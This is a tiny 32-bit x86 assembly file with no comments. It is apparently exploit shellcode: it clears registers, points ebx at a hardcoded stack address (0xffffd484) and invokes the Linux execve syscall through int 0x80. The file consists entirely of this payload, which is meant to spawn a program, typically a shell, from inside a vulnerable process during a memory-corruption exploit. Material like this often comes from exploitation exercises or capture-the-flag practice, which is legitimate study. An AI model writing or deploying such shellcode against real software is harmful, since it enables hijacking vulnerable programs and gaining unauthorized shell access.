bits 32

section .text
	global _start

_start:
	xor	edx, edx
	xor	ecx, ecx
	mov	ebx, 0xffffd484
	xor	eax, eax
	mov	al, 0xb
	int 0x80
